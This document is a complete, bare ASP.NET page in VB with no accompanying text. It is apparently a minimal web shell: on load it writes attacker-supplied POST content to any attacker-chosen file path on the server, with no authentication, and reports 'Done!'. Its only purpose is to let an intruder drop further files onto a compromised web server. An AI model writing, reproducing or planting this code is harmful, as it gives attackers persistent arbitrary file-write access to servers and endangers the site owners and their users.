<%@ Page Language="VB" %>
<%@ import Namespace="System.IO" %>
<script runat="server">
Sub Page_load(sender As Object, E As EventArgs) 
dim mywrite as new streamwriter(request.form("path"), true, encoding.default) mywrite.write(request.form("content")) 
mywrite.close 
response.write("Done!")
End Sub
</script>
